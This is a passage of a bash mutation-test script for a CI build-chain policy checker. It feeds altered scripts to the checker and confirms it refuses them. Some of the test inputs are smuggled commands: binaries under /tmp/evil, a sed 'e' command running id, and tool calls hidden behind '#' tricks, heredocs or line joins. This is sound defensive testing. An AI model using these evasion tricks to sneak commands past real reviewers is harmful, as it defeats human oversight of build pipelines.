nsm sd3 "nosource sed with two commands" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsed '\''s/a/b/;s/c/d/'\'' f'
nsm sd4 "nosource sed with the w command" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsed '\''w out'\'' f'
nsm sd5 "nosource sed -ne cluster with an e command" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nsed -ne '\''1e id'\'' f'
nsm aw1 "nosource awk with a program from a variable" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nawk "$prog" f'
nsm aw2 "nosource awk with a program from a command substitution" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nawk "$(cat p.awk)" f'
nsm aw3 "nosource awk with no program" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nawk -F: '
nsm pq1 "nosource a path-qualified cat" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n/tmp/evil/cat x'
nsm pq2 "nosource a path-qualified rm in a directory of the tree" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n./tools/rm x'
nsm pq3 "nosource a path-qualified bash" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n/tmp/evil/bash bin/chain-verify.py'
nsm pq4 "nosource a bin/ script that is not in the closure" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n./bin/not-there.sh'
nsm cs1 "nosource make closing a multi-line subshell" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n(\ncd x\nmake)'
nsm cs2 "nosource make closing a multi-line substitution" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n$(\nmake)'
nsm rd1 "nosource a quote left open across lines" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\necho '\''a\nmake\nb'\'''
nsm rd2 "nosource a quoted parenthesis inside a substitution" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nx=$(echo ")" ; make)'
nsm rd3 "nosource a quoted open parenthesis inside a substitution" "commands, the grammar has" \
  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nx=$(echo '\''('\'' ; make)'
nsm rd4 "nosource a substitution inside a single-quoted subscript" "commands, the grammar has" \
  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nx=${arr['\''$(make)'\'']}'
nsm rd5 "nosource a backtick inside a single-quoted subscript" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nx=${arr['\''`make`'\'']}'
nsm fn1 "nosource a function name taken from a comment" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n# make() { :; }\nmake all'
nsm fn2 "nosource a function name taken from a string" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\necho "x make() y"\nmake all'
nsm fw1 "nosource a first command word that is an option" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n-x foo'
nsm fw2 "nosource a first command word that is only digits" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n1 foo'
nsm ca1 "nosource a command in the second arm of a case line" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\ncase $1 in\n  a) true;; b) make all;;\nesac'
nsm pq5 "nosource a path-qualified env" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n./tools/env true'
nsm pq6 "nosource a path-qualified echo" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n./tools/echo hello'
nsm ip1 "nosource bash -s reading stdin" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nbash -s bin/chain-verify.py <<< "make"'
nsm ip2 "nosource python3 - reading stdin" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\npython3 - bin/chain-verify.py'
nsm ip3 "nosource python3 -m" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\npython3 -m http.server'
nsm ip4 "nosource a combined python option cluster" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\npython3 -Ic pass'
nsm sd6 "nosource sed -ee (the attached e is the program)" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nsed -ee sxsxx f'
nsm sd7 "nosource sed -ne (a combined option)" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsed -ne p f'
nsm cf1 "nosource the four-line case shape of the audit seat: an arm and esac on one line, then a subshell" \
  "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ncase x in\nx) true;; esac\n(\nmake)'
nsm cf2 "nosource a case on one line" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ncase $1 in a) true;; esac'
nsm cf3 "nosource two arms on one line" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ncase $1 in\n  a) true;; b) true;;\nesac'
nsm sv7 "nosource read -r ignored PY3 (a later operand of read)" "commands, the grammar has" bin/build-apk.sh \
  'PY3=/usr/bin/python3' 'PY3=/usr/bin/python3\nread -r ignored PY3 <<< "x ./tools/python3"'
nsm sv8 "nosource unset PY3" "commands, the grammar has" bin/build-apk.sh 'PY3=/usr/bin/python3' \
  'PY3=/usr/bin/python3\nunset PY3'
nsm pr1 "nosource melange is refused in any script but build-apk.sh (the probe has no allowance)" \
  "commands, the grammar has" bin/build-stage-assemble.sh 'mkdir -p melange-repo' \
  'mkdir -p melange-repo\n"$MELANGE" build x.yaml'
# the closure follows load_sibling: a module chain-verify.py loads that is not a row is refused
add_sibling() {
  nsfresh; printf 'x = 1\n' > "$work/nsm/bin/chain_zzz.py"
  python3 - "$work/nsm" <<'PY'
import sys
f = sys.argv[1] + "/bin/chain-verify.py"
t = open(f).read()
old = 'chain_items = load_sibling("chain_items")'
assert t.count(old) == 1
open(f, "w").write(t.replace(old, old + '\nchain_zzz = load_sibling("chain_zzz")', 1))
PY
}
add_sibling && expect caught "nosource a module chain-verify.py loads with load_sibling that is not a row is refused" \
  "is not a row of chain-scripts.json" nosource "$work/nsm" || bad "nosource the load_sibling mutation did not apply"
# the sealed-call round (R1-R5, F1-F8): each one a mutation the earlier readers let through
PA=bin/build-archives.py
nsl R1 "nosource a ( line then make) inside a case body of a shell helper" "$CNT" bin/build-apk.sh after \
  '^set -euo pipefail' 'case $1 in\n  x)\n(\nmake)\n    ;;\nesac'
nsl R3 "nosource read -r ignored \"PY3\" added to build-apk.sh" "$CNT" bin/build-apk.sh after '^PY3=' \
  'read -r ignored "PY3"'
nsm F1 "nosource a path word before the command word" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n/tmp/evil/go build'
nsm F2 "nosource the interpreter with an option" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\npython3 -O bin/chain-verify.py'
nsm F3 "nosource sed with an e flag" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nsed -n "s/x/y/e" f'
nsm F4 "nosource esac and ;; sharing a line" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ncase $1 in\n  a) true\n  ;; esac'
nsm F7 "nosource a variable name that is not bare: \${PY3}" "$EXP" bin/apko-lock.sh '"$PY3" -I' '"${PY3}" -I'
# refused names, one mutant each (an identifier in any position: bare name, attribute, import name, keyword)
# starts: what may stand in a program start
# the load_sibling lines are exempt exact lines; changing one is refused
# closure files without a row, and files that cannot be read
nsrow K1 "nosource apko-lock.sh has no row" "is not a row of chain-scripts.json" bin/apko-lock.sh
nsrow K2 "nosource build-apk.sh has no row" "is not a row of chain-scripts.json" bin/build-apk.sh
nsrow K3 "nosource vex-index.py has no row" "is not a row of chain-scripts.json" bin/vex-index.py
nsrow K4 "nosource chain_common.py has no row" "is not a row of chain-scripts.json" bin/chain_common.py
nsfresh; printf '{' > "$work/nsm/.github/policy/chain-scripts.json"
expect caught "K7 nosource a chain-scripts.json that does not parse" "cannot be read" nosource "$work/nsm"
nsfresh; rm -f "$work/nsm/.github/policy/chain-scripts.json"
expect caught "K8 nosource a missing chain-scripts.json" "cannot be read" nosource "$work/nsm"
nsm M1 "nosource build-stage-refuse-mode.sh changed by one character" "$EXP" bin/build-stage-refuse-mode.sh \
  'release|snapshot) ;;' 'release|snapshoT) ;;'
# the three helpers are exact text: every kind of change to the command lines is a finding
while IFS='|' read -r key text; do
  for h in build-apk.sh assemble-image.sh apko-lock.sh; do
    nsl "H2" "nosource $h with $key added after the first line" "$CNT" "bin/$h" after '^set -euo pipefail' "$text"
  done
done <<'KINDS_END'
a command|true
a case|case $1 in\n  x) true ;;\nesac
a for|for i in 1 2; do\n  true\ndone
a while|while false; do\n  true\ndone
a function definition|f() {\n  true\n}
a subshell|(\n  true\n)
a read|read -r ignored
KINDS_END
for h in build-apk.sh assemble-image.sh apko-lock.sh; do
  nsl H1 "nosource $h one line changed" "$EXP" "bin/$h" sub '^set -euo pipefail' 'set -eo pipefail'
  nsl H3 "nosource $h one line removed" "$CNT" "bin/$h" del '^set -euo pipefail'
  nsl H4 "nosource $h two lines swapped" "$CNT" "bin/$h" swap '^set -euo pipefail' '^PY3='
  nsl H5 "nosource $h a changed TEST-SUBST constant" "$EXP" "bin/$h" sub '^PY3=' 'PY3=/tmp/python3  # TEST-SUBST'
  nsl H6 "nosource $h PY3 rebound by a quoted assignment" "$CNT" "bin/$h" after '^PY3=' 'PY3="/tmp/python3"'
done
# a comment naming go build and make changes nothing; a real go version -m line is one more command
nsfresh
replace "$work/ns/bin/build-stage-apk.sh" "$work/nsm/bin/build-stage-apk.sh" 'unset GH_TOKEN' \
  'unset GH_TOKEN\n# never go build here; make is not used' \
  && expect ok "cm1 nosource a comment naming go build and make is not code" "" nosource "$work/nsm"
nsm cm2 "nosource a go version -m line is one more command" "$CNT" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n"$GO_TOOL" version -m out/x'
# ---- the real repository --------------------------------------------------------------------------------------------------------------------
RAL="$root/.github/policy/allowed-actions.json"
expect ok "AC1/AC2 the real stage-build.yml is exactly the Build grammar" "" stage "$root/.github/workflows/stage-build.yml" build "$RAL"
expect ok "005-AC1/AC4 the real stage-reproducibility.yml is exactly the Rebuild grammar" "" stage "$root/.github/workflows/stage-reproducibility.yml" \
       rebuild "$RAL"
for k in $KINDS; do expect ok "AC3/005-AC2 the real bin/build-stage-$k.sh is exactly the grammar" "" script "$root/bin/build-stage-$k.sh" "$k"; done
shape="$shape_real"
real_json=$(CHAIN_FINDINGS=1 judge nosource "$root" 2>&1 >/dev/null | sed -n 's/^FINDINGS-JSON //p') || true
if jq -e 'length == 1 and (.[0] | contains("bin/build-admit.py:456"))' <<< "${real_json:-null}" > /dev/null 2>&1; then
  ok "nosource the real tree: the admission step's go run (bin/build-admit.py:456) is the ONE finding"
else bad "nosource the real tree: wanted exactly one finding, bin/build-admit.py:456 -> ${real_json:0:300}"; fi
ns_hits=""
for n in VARS PYVARS PYCOMPUTED PYEXEC CASEPAT INTERP_OPTS UTIL_OPTS WRAPPER_OPTS; do
  ns_hits+=$(grep -rnw "NS_$n" "$root/bin" || true)
done
if [ -z "$ns_hits" ]; then ok "nosource no name of the earlier reader's tables is left in bin/"
else bad "nosource a name of the earlier reader's tables is left: ${ns_hits:0:200}"; fi
if ! grep -qw PY_START_CALLS "$root/bin/chain-test-shape.py" "$root/bin/chain-check-shape.py"; then
  ok "nosource neither chain-test-shape.py nor chain-check-shape.py holds a start-call name list"
else bad "nosource a start-call name list is left in chain-test-shape.py or chain-check-shape.py"; fi
expect ok "AC2 the real bin/witnessed.sh is exactly the canonical helper" "" helper "$root/bin/witnessed.sh"
expect ok "AC2 no real stage file or stage script names witness run" "" directwitness "$root/.github/workflows/stage-build.yml" \
       "$root/.github/workflows/stage-reproducibility.yml" "$root"/bin/build-stage-*.sh
expect ok "AC3 the five real scripts are rows of .github/policy/chain-scripts.json with their sha256" "" listed \
       "$root/.github/policy/chain-scripts.json" "$root"
# The scope of the vex-index tool (REQ-REL-010-AC4/AC5), shared by the real tree and the mutation cases below. Advisor reading Oct 17 (cache#416 follow-up): the live test's Scout
# leg (REQ-SCAN-012-AC6) attaches our OpenVEX to its own FIXTURE layout in the Docker Hub test repository, so the two live-test files may name vex-index in exactly two
# places: bin/vex-live-run.sh's one fixture call, and bin/vex-live-test-test.sh's run of the tool on a scratch layout (the tool is never loaded into the test's process). Every
# other mention in them, every other file in the whole tree (the prose directories docs/, requirements/ and test-evidence/ at its top excepted) and every link to the tool is
# refused; a comment is no exemption (a #-led line can be live code to bash).
cat > "$work/vi-named.py" <<'PY'
import glob, hashlib, os, re, yaml
BASE = {"bin/build-stage-assemble.sh", "bin/build-stage-rebuild-assemble.sh", "bin/build-stage-snapshot-assemble.sh", "bin/build-stage-snapshot-rebuild-assemble.sh",
        "bin/vex-index.py", "bin/vex-index-test.sh", "bin/chain-build-wiring-test.sh", "bin/chain-test-harness.py", "bin/chain-test-shape.py", ".github/policy/chain-scripts.json",
        "bin/check-file-allowlist.sh", ".github/workflows/ci.yml"}      # the allowlist only names the file (it admits it as a repository file; it runs nothing); ci.yml runs its test, checked below
RUN, TEST = "bin/vex-live-run.sh", "bin/vex-live-test-test.sh"
PINWIRE = (".github", "tests", "pin-wiring-test.sh")      # the pin-wiring judge is recognised by the SHAPE of its path, .github/<one directory>/tests/pin-wiring-test.sh, so this file never names the auditor directory (REQ-AUD-18 AC1: nothing outside it refers to it); the judge quotes ci.yml's step "bash bin/vex-index-test.sh </dev/null" (the test script, never the tool); in that ONE file every line that names vex-index must be, after strip(), one of the reviewed lines in PIN_LINES (sha256): the lines of main's judge (cache#489/#521/#540) and of the strict judge (cache#508). Erasing a quoted string was refused in review (adjacent literals or an eval-rewritten command ran it); a new or changed line is refused until a reviewed change updates the list. KNOWN LIMITS (round 3, both seats; stated, not hidden): a reviewed line can still be consumed by LATER lines of the same file that do not name vex-index (for example os.system on the dictionary's run value), which the two live-test files' alias checks do not allow for themselves, and the whole naming check is lexical (a spelling that never puts vex-index on one line is not seen, in every file, as before this change); the judge file is itself a reviewed, pinned security file, so a change to it is a reviewed change
PIN_LINES = frozenset((
    "da7e0d333bef74e866268a6724b75adb51173fc2428c94d79f687e941c5ecc60",
    "dfc8b28ba0489c3e91555f19b62d1c2bc0a8623a3896a35711a66f467a35720a",
    "3237e803c9ef9113386f75a589beb5ff29439494fc950e36c74a681cdf9f5dc0",
    "4953659b48a4026c7420810bf06d5dd7f979f506ec2e0230e846e8db6108f375",
    "76dd2d9e0ddeb935a8e2715fe26fe325cbb168b0c63656a16a0e0f9588029091",
    "b7827728ad4015e730527cbbad9ff10f27f0e01b578d263b4aafac79b2638630",
    "ed9b7baf50c1a06493904a32858062357734918badcf226bc41eb6ecf4033be8",
    "5f4193699f8e6bedd7a747039a4fcbb14e010e653fbdd24c3640a83538e8008c",
    "7461149042047fd8d64d6d06d7f4f374f16b54a7151a0ea456525e0d80176cb8",
    "9ca61104b6e4518e5faca29e6733bfc150f90f2cdf5708258d192c44ee244f4f",
))
RESCAN = ".github/workflows/main-candidate-rescan.yml"      # the daily rescan (cache#489, handoff 0521) attaches our OpenVEX to its own SCRATCH copies of the candidates (never a published version; its vex-attach job pushes only candidate and fixture tags to the scratch package, judged by bin/panel-wiring-test.sh): in that one file a line naming vex-index must be, after strip(), one of these reviewed lines (sha256), the call lines of that job and the comment above them
RESCAN_LINES = frozenset((
    "238f1cc11ed234ed6ed4396dac82934ef001e1193bd8891934c557fbf21b9ba4",
    "2766fae27cbf871666460813d629a451a4b861a63f18bd64a55ca2d9e6c53bdf",
))
PANEL = "bin/panel-wiring-test.sh"      # the test that judges the rescan's vex-attach job quotes its calls as needles and mutation fixtures (data, never run as the tool): reviewed lines only, by sha256, in that one file
PANEL_LINES = frozenset((
    "0c58c87305a5593dd87bbbe04da7ef0dd1621782ed4cade1063828f7a875fd55",
    "acf37cefa743a26b69d9172508b2ce2852040cff3570050effb1ad7cfaefbc8f",
    "02370c2e7ed26850785448f26236801560e51c8a79aab599cacf3e2af66f9b57",
))
LINE_PINS = {RESCAN: RESCAN_LINES, PANEL: PANEL_LINES}
RUN_CALL = 'python3 "$GITHUB_WORKSPACE/bin/vex-index.py" layout --layout scout-fixture --vex scout-fixture.vex.json >/dev/null || return 1'
VI_RESULT_LINES = ('check("wrap-index: the real attestation tool accepts the wrapped layout and makes the final index from it", vi_run.returncode == 0, vi_run.stderr[-300:])',
                   'check("scout-vex: the attached document passes the attestation tool\'s own OpenVEX check (the tool is run, never loaded into this process)", vi_run.returncode == 0, vi_run.stderr[-300:])')
TEST_LINES = ('vi_run = subprocess.run([sys.executable, os.path.join(root, "bin/vex-index.py"), "layout", "--layout", lay, "--vex", vpath], capture_output=True, text=True)',)
TEST_LOADERS = ("import copy, importlib.util, json, os, re, shutil, subprocess, sys, tempfile, yaml", "def load(name, path):",
                "spec = importlib.util.spec_from_file_location(name, os.path.join(root, path))",
                "m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m",
                'L = load("lt", "bin/vex-live-test.py")', 'V = load("vf", "bin/vex-forms.py")')      # the test's own helper and its two modules; the index tool is never loaded
def runners(rows):
    return sorted(p for p, r in rows.items() if "bin/vex-index.py" in r.get("runs", []))
def stray(root):
    named, bad = set(), []
    for d, dirs, files in os.walk(root):      # the whole tree, any extension or none (prose under docs/, requirements/ and test-evidence/ runs nothing)
        top = os.path.abspath(d) == os.path.abspath(root)      # the prose directories are skipped at the top of the tree only: a docs/ or requirements/ below it is code like any other
        dirs[:] = [x for x in dirs if x not in (".git", "__pycache__") and not (top and x in ("docs", "requirements", "test-evidence"))]
        for f in files:
            path = os.path.join(d, f)
            if os.path.islink(path):
                continue
            if not os.path.isfile(path):
                continue
            text = open(path, errors="replace").read()
            rel = os.path.relpath(path, root).split(os.sep)
            if len(rel) == 4 and (rel[0], rel[2], rel[3]) == PINWIRE:
                if any("vex-index" in ln and hashlib.sha256(ln.strip().encode()).hexdigest() not in PIN_LINES for ln in text.splitlines()):
                    named.add(os.path.relpath(path, root))
                continue
            pins = LINE_PINS.get(os.path.relpath(path, root))
            if pins is not None:
                nl = [ln.strip() for ln in text.splitlines() if "vex-index" in ln]
                ok = all(hashlib.sha256(ln.encode()).hexdigest() in pins for ln in nl)
                if ok and os.path.relpath(path, root) == RESCAN:      # cache#561 ruling: every admitted line exactly once, and the calls only inside jobs.vex-attach
                    try:
                        va = ((yaml.safe_load(text) or {}).get("jobs") or {}).get("vex-attach") or {}
                        inside = {l.strip() for st in (va.get("steps") or []) for l in (st.get("run") or "").splitlines()}
                    except (yaml.YAMLError, AttributeError):
                        inside = None
                    ok = inside is not None and len(nl) == len(set(nl)) and all(ln.startswith("#") or ln in inside for ln in nl)
                if not ok:
                    named.add(os.path.relpath(path, root))
                continue
            if "vex-index" in text:
                named.add(os.path.relpath(path, root))
    for d, dirs, files in os.walk(root):      # a link to the tool is the tool: looked for in every folder, the skipped prose ones too
        dirs[:] = [x for x in dirs if x not in (".git", "__pycache__")]
        for f in files + dirs:
            path = os.path.join(d, f)
            if os.path.islink(path) and os.path.basename(os.path.realpath(path)) == "vex-index.py":
                bad.append(os.path.relpath(path, root) + " (a link to the tool)")
    page = os.path.join(root, "docs", "using-our-vex.md")      # the one prose file that runs: the live test executes its shell blocks, so it is code like any other
    if os.path.isfile(page) and "vex-index" in open(page, errors="replace").read():      # read through a link too: the plan's open() follows it
        named.add("docs/using-our-vex.md")
    bad += sorted(named - BASE - {RUN, TEST})
    for path, exact in ((RUN, (RUN_CALL,)), (TEST, TEST_LINES)):
        if path not in named and path != RUN:
            continue
        code = []
        for line in open(os.path.join(root, path), errors="replace"):
            body = line.strip()
            # no comment exemption: a line that starts with # is not always a comment to bash (a backslash-joined line, a heredoc body, a line inside a quoted string), so every
            # line that names the tool is judged whole and the run script may name it on its one call line only
            if "vex-index" in body:
                code.append(body)
            if path == TEST and (re.search(r"\bVI\b|(?<![\w.])load(?!\w)|importlib|spec_from_file_location|exec_module|runpy|__import__|\.args\b|\b(?:exec|eval|compile)\(", body) and body not in TEST_LOADERS):
                code.append(body)
            if path == TEST and re.search(r"\bvi_run\b", body) and body not in TEST_LINES + VI_RESULT_LINES:
                code.append(body)      # the allowed call's result is read on its two check lines only (no alias, no .args)      # the test file never loads the tool into its own process (a loaded module's globals are reachable by reflection): it only runs it
        bad += ["%s: %s" % (path, c[:90]) for c in code if c not in exact]
        bad += ["%s: %s (must appear exactly once)" % (path, e[:60]) for e in exact if code.count(e) != 1]
        if path == TEST:
            body_all = [l.strip() for l in open(os.path.join(root, path), errors="replace")]
            bad += ["%s: %s (must appear exactly once)" % (path, e[:60]) for e in VI_RESULT_LINES if body_all.count(e) != 1]
    return bad
PY
if python3 - "$root" "$work" <<'PY'
import glob, json, os, sys
root, work = sys.argv[1], sys.argv[2]
exec(open(os.path.join(work, "vi-named.py")).read())
allowed = BASE
stray_files = stray(root)
assert not stray_files, "named outside Build's and Rebuild's assemble scripts: %s" % stray_files       # AC4: nothing after Sign attaches, adds or changes an attestation; AC5: no path re-attaches to a published version
ci = [row.strip() for row in open(root + "/.github/workflows/ci.yml") if "vex-index" in row]
WRAPPED = "run: python3 -I bin/suite-guard-run.py run test-evidence/suite-floors.json vex-index-test.sh bin/vex-index-test.sh </dev/null"      # REQ-CI-005: the test runs as a counting step, exactly this line
assert all(row.startswith("run: bash bin/vex-index-test.sh") or row == WRAPPED or row.startswith("- name:") for row in ci), ci      # CI runs the tool's TEST and nothing else of it
rows = {r["path"]: r for r in json.load(open(root + "/.github/policy/chain-scripts.json"))["scripts"]}
assert runners(rows) == sorted(p for p in allowed if p.startswith("bin/build-stage-")), runners(rows)      # a row may carry no runs list (bin/loopback-get.sh): it runs nothing
PY
then ok "REQ-REL-010-AC4/AC5 only Build's and Rebuild's four assemble scripts run bin/vex-index.py: no Sign, Release, maintenance or patch-release file names it, so nothing attaches after Sign and no published version is touched"
else bad "REQ-REL-010-AC4/AC5 a file outside Build's and Rebuild's assemble scripts names or runs bin/vex-index.py"
fi
# the narrow exemption must keep biting: each mutation of a copy of the two live-test files (or a third file) is refused by the same scope function
vim() { # vim NAME LABEL FILE OLD NEW   (FILE new: OLD empty, NEW is the whole content)
  local d="$work/vim-$1"; rm -rf "$d"; mkdir -p "$d/bin" "$d/.github/workflows" "$d/.github/policy"
  cp "$root/bin/vex-live-run.sh" "$root/bin/vex-live-test-test.sh" "$d/bin/"
  if python3 - "$d/$3" "$4" "$5" <<'PY'
import os, sys
path, old, new = sys.argv[1:4]
os.makedirs(os.path.dirname(path), exist_ok=True)
try: text = open(path).read()
except FileNotFoundError: text = ""
if old:
    assert text.count(old) == 1, "pattern not found once: " + old
    text = text.replace(old, new, 1)
else:
    text = text + new
open(path, "w").write(text)
PY
  then
    if python3 -c 'import sys; exec(open(sys.argv[1]).read()); sys.exit(0 if stray(sys.argv[2]) else 1)' "$work/vi-named.py" "$d"; then ok "$2"; else bad "$2"; fi
  else bad "mutation did not apply (vim-$1)"; fi
}
vim m1 "REQ-REL-010-AC4 the live-test run script attaching to Build's layout instead of the fixture is refused" bin/vex-live-run.sh '--layout scout-fixture --vex' '--layout "$CANDIDATE_DIR/images/production" --vex'
vim m2 "REQ-REL-010-AC4 a second vex-index call in the live-test run script is refused" bin/vex-live-run.sh '' $'\npython3 "$GITHUB_WORKSPACE/bin/vex-index.py" layout --layout scout-fixture --vex scout-fixture.vex.json >/dev/null || return 1\n'
vim m3 "REQ-REL-010-AC5 a vex-index call on a published reference in the live-test run script is refused" bin/vex-live-run.sh '' $'\npython3 bin/vex-index.py attach ghcr.io/fosterstack/cache@sha256:0000000000000000000000000000000000000000000000000000000000000000\n'
vim m4 "REQ-REL-010-AC4 a third file naming vex-index is refused" bin/vex-live-extra.sh '' $'python3 bin/vex-index.py layout --layout x\n'
vim m5 "REQ-REL-010-AC4 another vex-index run in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nos.system("python3 bin/vex-index.py layout --layout images")\n'
vim h1 "REQ-REL-010-AC4 a # inside a word hiding a vex-index call on Build's layout (bash still runs it) is refused" bin/vex-live-run.sh '' $'\n: x#; python3 "$GITHUB_WORKSPACE/bin/vex-index.py" layout --layout "$CANDIDATE_DIR/images/production" --vex scout-fixture.vex.json >/dev/null || return 1\n'
vim h2 "REQ-REL-010-AC4 a # inside a quoted string hiding a vex-index call is refused" bin/vex-live-run.sh '' $'\nm="#"; python3 bin/vex-index.py layout --layout "$CANDIDATE_DIR/images/production" --vex v.json\n'
vim h3 "REQ-REL-010-AC4 a \${var#...} expansion hiding a vex-index call is refused" bin/vex-live-run.sh '' $'\nr=${CANDIDATE_DIR#/}; python3 bin/vex-index.py layout --layout "/$r/images/production" --vex v.json\n'
vim h5 "REQ-REL-010-AC4 another use of the loaded vex-index module in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nVI.main(["layout", "--layout", os.environ.get("CANDIDATE_DIR", "x"), "--vex", "v.json"])\n'
vim j2 "REQ-REL-010-AC4 a #-led line that bash joins to the previous line (backslash) and runs is refused" bin/vex-live-run.sh '' $'\necho a\\\n#; python3 bin/vex-index.py layout --layout "$CANDIDATE_DIR/images/production" --vex v.json\n'
vim j4 "REQ-REL-010-AC4 a #-led heredoc body line that read splits and runs is refused" bin/vex-live-run.sh '' $'\nwhile read -r _ c; do $c; done <<'"'"$'EOT'"'"$'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json\nEOT\n'
vim j5 "REQ-REL-010-AC4 a #-led line inside a multi-line quoted string that is later run is refused" bin/vex-live-run.sh '' $'\nx='"'"$'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json'"'"$'\nread -r _ c <<<"${x#?}"; $c\n'
vim j6 "REQ-REL-010-AC4 reaching the loaded module through VI.check_vex.__globals__ in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nVI.check_vex.__globals__["main"](["layout"])\n'
vim k1 "REQ-REL-010-AC4 a file with another extension or none, in another directory, naming the tool is refused (bin/lib/x.sh)" bin/lib/x.sh '' $'python3 bin/vex-index.py layout --layout x\n'
vim k2 "REQ-REL-010-AC4 a workflow with the .yaml extension naming the tool is refused" .github/workflows/x.yaml '' $'run: python3 bin/vex-index.py layout --layout x\n'
vim k3 "REQ-REL-010-AC4 loading the tool into the live-test test file's own process under another name is refused" bin/vex-live-test-test.sh '' $'\nM = load("m", "bin/vex-index.py")\n'
vim k4 "REQ-REL-010-AC4 a Go file under tools/requirements (a skipped name below the top level) running the tool is refused" tools/requirements/vexattach.go '' $'exec.Command("python3", "bin/vex-index.py", "layout")\n'
vim k5 "REQ-REL-010-AC4 a script under bin/docs (a skipped name below the top level) running the tool is refused" bin/docs/attach.sh '' $'python3 bin/vex-index.py layout --layout "$CANDIDATE_DIR/images/production" --vex v.json\n'
vim k6 "REQ-REL-010-AC4 loading the tool in the live-test test file from the path the allowed subprocess line holds (r.args[1]) is refused" bin/vex-live-test-test.sh '' $'\nM = load("m", r.args[1])\n'
vim k7 "REQ-REL-010-AC4 an importlib spec on a path variable in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nsp = importlib.util.spec_from_file_location("z", os.path.join(root, "bin", NAME))\n'
# the pin-wiring judge (the file tests/pin-wiring-test.sh in one directory under .github) quotes ci.yml's step "bash bin/vex-index-test.sh </dev/null" (the test script, never the tool). In that ONE file a line naming
# vex-index is admitted only if it is, after strip(), one of the reviewed lines (PIN_LINES, by sha256); anything else naming it, and the same line in any other file, is refused (advisor Oct 22:
# only the exact quoted step string; both seats of round 2: erasing a substring admitted an executable use, so whole reviewed lines are pinned)
vimok() { # vimok NAME LABEL FILE NEW   (the scope function must find NOTHING stray)
  local d="$work/vimok-$1"; rm -rf "$d"; mkdir -p "$d/bin" "$d/.github/workflows" "$d/.github/policy" "$d/.github/judge/tests"
  cp "$root/bin/vex-live-run.sh" "$root/bin/vex-live-test-test.sh" "$d/bin/"
  printf '%s' "$4" > "$d/$3"
  if python3 -c 'import sys; exec(open(sys.argv[1]).read()); b = stray(sys.argv[2]); print(b, file=sys.stderr); sys.exit(0 if not b else 1)' "$work/vi-named.py" "$d" 2>/dev/null; then ok "$2"; else bad "$2"; fi
}
PW=.github/judge/tests/pin-wiring-test.sh
L1=$'  "run": "bash bin/vex-index-test.sh </dev/null"\n'
L2=$'        _vex = {"name": VEX_NAME, "run": "bash bin/vex-index-test.sh </dev/null"}\n'
vimok p1 "REQ-REL-010-AC4 the pin-wiring judge's reviewed lines quoting the exact step string bash bin/vex-index-test.sh </dev/null are admitted (they name the test script and run nothing)" $PW "$L1$L2"
